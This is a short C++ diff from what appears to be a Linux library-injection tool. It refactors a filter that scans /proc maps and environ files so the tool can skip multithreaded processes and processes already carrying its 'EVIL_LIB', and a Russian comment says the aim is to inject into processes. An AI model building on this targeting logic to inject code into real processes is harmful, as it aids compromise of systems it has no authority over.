@@ -51,30 +51,25 @@ void make_noise() {
 namespace fs = std::experimental::filesystem;
 using namespace std::string_literals;
 
-// TODO научиться останавливать многопоточные приложения и инжектиться в них
-bool is_filtered(const pid_t pid) {
-	auto maps = fs::path{"/proc"} / std::to_string(pid) / "maps"s;
-	std::ifstream f{maps};
+bool is_in_file(const pid_t pid, std::string_view file, std::string_view pattern) {
+	auto path = fs::path{"/proc"} / std::to_string(pid) / file;
+	std::ifstream f{path};
 	if (!f) {
 		return true;
 	}
 	for (auto it = std::istream_iterator<std::string>(f); it != std::istream_iterator<std::string>(); ++it) {
-		if (it->find("/libpthread-") != it->npos) {
-			return true;
-		}
-	}
-	auto environ = fs::path{"/proc"} / std::to_string(pid) / "environ"s;
-	f.open(environ);
-	f.clear();
-	if (!f) {
-		return true;
-	}
-	for (auto it = std::istream_iterator<std::string>(f); it != std::istream_iterator<std::string>(); ++it) {
-		if (it->find(EVIL_LIB) != it->npos) {
+		if (it->find(pattern) != it->npos) {
 			return true;
 		}
 	}
 	return false;
+}
+
+// TODO научиться останавливать многопоточные приложения и инжектиться в них
+bool is_filtered(const pid_t pid) {
+	return is_in_file(pid, "maps", "/libpthread-")
+	    || is_in_file(pid, "maps", EVIL_LIB)
+		|| is_in_file(pid, "environ", EVIL_LIB);
 }
 
 } // namespace
